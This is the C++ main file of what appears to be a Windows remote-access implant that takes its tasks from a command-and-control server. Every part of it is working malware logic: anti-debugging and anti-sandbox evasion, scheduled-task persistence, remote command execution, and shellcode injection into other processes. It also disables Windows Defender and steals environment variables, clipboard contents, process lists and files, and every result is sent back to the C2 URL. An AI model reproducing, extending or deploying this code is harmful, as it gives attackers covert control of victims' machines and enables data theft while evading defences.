#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <stdio.h>
#include <sodium.h>
#include <string.h>
#include <vector>
#include <time.h>
#include "obfuscator/MetaString.h"
#include "rapidjson/rapidjson.h"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "crypto.h"
#include "httpclient.h"
#include "profile.h"
#include "implant.h"
#include "constants.h"
#include "debug.h"
#include "opcode.h"
#include "command.h"
#include "utils.h"
#include "handlers.h"
#include "schtask.h"
#include "antidebug.h"
#include "antisandbox.h"

using namespace std;
using namespace andrivet::ADVobfuscator;

MalleableProfile *currentProfile;

void LoopRegister(string privKey, string pubKey)
{
	while (TRUE)
	{
		float sleeptime = currentProfile->retryWait + (currentProfile->retryWait * currentProfile->jitter);
		if (DetectSleepSkip(sleeptime * 1000))
		{
			DEBUG_PRINTF("Sleep skipped, exiting\n");
			exit(1);
		}

		currentProfile = Register(toWide(C2_URL), pubKey, privKey);
	}
}

int main()
{

	if (DEBUG == 0)
	{
		FreeConsole();
		Sleep(INITIAL_SLEEP_SECONDS * 1000);
	}

	if (sodium_init() < 0)
	{
		return 1;
	}

	if (USE_ANTIDEBUG)
	{
		// Anti Debug
		StartAntiDebugThread();
	}

	if (USE_ANTISANDBOX)
	{
		// Anti Sandbox
		MemeIfSandboxed();
	}

	if (SCHTASK_PERSIST)
	{
		// Persistence
		wchar_t *pSelfImplantPath = GetImplantPath();
		int task_status = createScheduledTask(pSelfImplantPath, SysAllocString(L"15:30:00"));
	}

	string privKey;
	string pubKey;
	int status = createBase64KeyPair(&privKey, &pubKey);

	if (status != 0)
	{
		DEBUG_PRINTF("Error creating key pair, aborting\n");
		exit(1);
	}

	while (TRUE)
	{
		int tries = 0;
		DEBUG_PRINTF("Registering...\n");
		DEBUG_PRINTF("URL: %s\n", C2_URL);
		currentProfile = Register(toWide(C2_URL), pubKey, privKey);

		if (DetectSleepSkip(1000))
		{
			DEBUG_PRINTF("Sleep skipped, exiting\n");
			exit(1);
		}

		if (currentProfile == NULL)
		{
			DEBUG_PRINTF("Error registering, aborting\n");
			if (tries >= REGISTER_MAX_RETRIES)
			{
				DEBUG_PRINTF("Max retries reached, exiting\n");
				exit(1);
			}
			tries++;
		}
		else
		{
			break;
		}
	}

	// currentProfile = Register(toWide(C2_URL), pubKey, privKey);
	// if (currentProfile == NULL)
	// {
	// 	DEBUG_PRINTF("Error registering, aborting\n");
	// 	exit(1);
	// }

	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());

	// Checkin loop
	while (TRUE)
	{
#ifndef DEBUG
		// Get random float between 0 and currentProfile->jitter
		float maxJitter = currentProfile->jitter;
		float jitter = (float)rand() / (float)RAND_MAX;
		jitter = jitter * maxJitter;
		float sleeptime = currentProfile->sleep + (currentProfile->sleep * jitter);
#else
		float sleeptime = 5.f;
#endif
		if (DetectSleepSkip(sleeptime * 1000))
		{
			DEBUG_PRINTF("Sleep skipped, exiting\n");
			exit(1);
		}
		Task *newTask = Checkin(toWide(C2_URL), currentProfile);
		if (newTask == NULL)
		{
			continue;
		}

		DEBUG_PRINTF("Task ID: %s\n", newTask->taskId.c_str());
		int opcode = newTask->opcode;
		bool success = false;
		DEBUG_PRINTF("Opcode: %d\n", opcode);

		PrintJsonType(newTask->args);

		if (opcode == OPCODE_CMD)
		{
			HandleCmd(newTask, currentProfile);
		}
		else if (opcode == OPCODE_SELFDESTRUCT)
		{
			SelfDestruct();
		}
		else if (opcode == OPCODE_SYSINFO)
		{
			string sysInfo = SysInfo();
			success = true;
			if (!SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), sysInfo.c_str(), success, currentProfile))
			{
				DEBUG_PRINTF("Error sending output\n");
			}
		}
		else if (opcode == OPCODE_SLEEP)
		{
			int numSeconds = newTask->args->GetInt();
			if (numSeconds < 0)
			{
				DEBUG_PRINTF("Invalid sleep time\n");
				continue;
			}
			Sleep(numSeconds * 1000);
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), "", true, currentProfile);
		}
		else if (opcode == OPCODE_UPDATE_CONFIG)
		{
			rapidjson::Value *changes = newTask->args;
			UpdateProfile(changes, currentProfile);
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), "", true, currentProfile);
		}
		else if (opcode == OPCODE_DOWNLOAD)
		{
			std::string result = Download(newTask->args->GetString());
			// see if `ERROR` is the start of the string, very hacky
			success = result.compare(0, 5, OBFUSCATED("ERROR")) != 0;
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, success, currentProfile);
		}
		else if (opcode == OPCODE_UPLOAD)
		{
			// Print type of args
			rapidjson::Type argsType = newTask->args->GetType();
			DEBUG_PRINTF("Args type: %d\n", argsType);

			// Get array of args
			rapidjson::GenericArray<false, rapidjson::Value> arr = newTask->args->GetArray();
			std::string fileName = arr[0].GetString();
			std::string b64content = arr[1].GetString();
			DEBUG_PRINTF("Uploading %s\n", fileName.c_str());
			std::string result = Upload(fileName, b64content);
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_INJECT)
		{
			rapidjson::GenericArray<false, rapidjson::Value> arr = newTask->args->GetArray();
			std::string shellcode = arr[0].GetString();
			std::string processName = arr[1].GetString();
			std::string result = Inject(shellcode, processName);
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_CHDIR)
		{
			std::string dir = newTask->args->GetString();
			BOOL result = ChangeDir(dir);
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), "", result != FALSE, currentProfile);
		}
		else if (opcode == OPCODE_PWD)
		{
			std::string result = GetDir();
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_GETENV)
		{
			std::map<std::string, std::string> result = GetAllEnvVars();
			std::string resultStr = "";
			for (auto &var : result)
			{
				resultStr += var.first + "=" + var.second + "\n";
			}
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), resultStr, resultStr != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_LS)
		{
			std::vector<std::string> result = GetAllFilesInCurrentDirectory();
			std::string resultStr = "";
			for (auto &file : result)
			{
				resultStr += file + "\n";
			}
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), resultStr, resultStr != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_PS)
		{
			std::map<std::string, DWORD> pidMap = GetProcessNameToPIDMap();
			std::string resultStr = "";
			for (auto &pid : pidMap)
			{
				resultStr += pid.first + "=" + std::to_string(pid.second) + "\n";
			}
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), resultStr, resultStr != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_WHOAMI)
		{
			std::string result = Whoami();
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_DISABLE_DEFENDER)
		{
			BOOL result = DisableDefender();
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), "", result != FALSE, currentProfile);
		}
		else if (opcode == OPCODE_CLIPBOARD_GET)
		{
			std::string result = GetClipboard();
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
		}
		else if (opcode == OPCODE_CLIPBOARD_SET)
		{
			std::string result = SetClipboard(newTask->args->GetString());
			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
		}
		else
		{
			DEBUG_PRINTF("Invalid opcode\n");
		}
	}
}
